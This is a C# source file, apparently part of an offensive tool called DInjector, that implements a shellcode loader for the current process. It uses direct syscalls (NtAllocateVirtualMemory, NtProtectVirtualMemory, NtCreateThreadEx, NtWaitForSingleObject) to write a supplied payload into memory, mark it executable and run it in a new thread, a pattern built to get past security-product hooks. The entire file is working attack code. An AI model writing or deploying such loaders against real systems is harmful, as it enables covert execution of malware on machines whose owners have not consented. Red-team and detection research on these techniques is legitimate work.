using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class CurrentThread
    {
        public static void Execute(byte[] shellcode)
        {
            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
            else
                Console.WriteLine($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");

            #endregion

            #region NtWaitForSingleObject

            ntstatus = Syscalls.NtWaitForSingleObject(
                hThread,
                false,
                0);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
            else
                Console.WriteLine($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");

            #endregion

            Win32.CloseHandle(hThread);
        }
    }
}
